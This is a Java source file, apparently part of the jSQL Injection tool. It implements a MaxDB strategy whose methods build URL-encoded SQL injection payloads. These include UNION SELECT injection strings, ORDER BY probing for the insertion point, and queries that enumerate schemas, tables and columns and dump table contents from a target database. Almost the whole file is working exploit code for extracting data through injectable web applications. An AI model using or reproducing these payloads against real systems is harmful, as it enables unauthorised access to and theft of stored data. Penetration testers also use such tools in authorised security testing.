package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class MaxDbStrategy extends ASQLStrategy {

    @Override
    public String getSchemaInfos() {
        return
            "SELECT+'-'||id||'{%}'||DATABASE()||'{%}'||user()||'{%}'||'%3F'||'%01%03%03%07'r+from+sysinfo.VERSION";
    }

    @Override
    public String getSchemaList() {
        return
            "select+rr||'%01%03%03%07'r+from(select+'%04'||trim(t.schemaname)||'%050%04'rr+" +
            "from(select+distinct+schemaname+from+SCHEMAS)t,(select+distinct+schemaname+from+SCHEMAS)t1+" +
            "where+t.schemaname>=t1.schemaname+" +
            "group+by+t.schemaname{limit})a";
    }

    @Override
    public String getTableList(Database database) {
        return
            "select+rr||'%01%03%03%07'r+from(select+'%04'||trim(t.tablename)||'%050%04'rr+" +
            "from(select+distinct+tablename+from+TABLES+where+SCHEMANAME='" + database + "')t,(select+distinct+tablename+from+TABLES+where+SCHEMANAME='" + database + "')t1+" +
            "where+t.tablename>=t1.tablename+" +
            "group+by+t.tablename{limit})a";
    }

    @Override
    public String getColumnList(Table table) {
        return
            "select+rr||'%01%03%03%07'r+from(select+'%04'||trim(t.COLUMNNAME)||'%050%04'rr+" +
            "from(select+distinct+COLUMNNAME+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')t,(select+distinct+COLUMNNAME+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')t1+" +
            "where+t.COLUMNNAME>=t1.COLUMNNAME+" +
            "group+by+t.COLUMNNAME{limit})a";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "{%}");
        
        // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
        formatListColumn = formatListColumn.replace("{%}", "),''))||'%7F'||trim(ifnull(chr(");
        formatListColumn = "trim(ifnull(chr(" + formatListColumn + "),''))";
        
        return
            "select+rr||'%01%03%03%07'r+from(select+'%04'||trim(t.s)||'%050%04'rr+" +
            "from(select+distinct+" + formatListColumn + "s+from+" + database + "." + table + ")t,(select+distinct+" + formatListColumn + "s+from+" + database + "." + table + ")t1+" +
            "where+t.s>=t1.s+" +
            "group+by+t.s{limit})a";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return
            "select+'SQLi'||SUBSTR(r," + startPosition + ",1500)from(" + sqlQuery + ")x";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "(select'SQLi$1'||rpad('%23',1024,'%23',1025)||'iLQS'from+dual)"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
        String replaceTag = "";
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("*");
            replaceTag = "select(1337"+ i +"7330%2b1)y+from+dual";
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "+from(" + replaceTag + ")z+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
    }
    
    @Override
    public String getDbLabel() {
        return null;
    }
}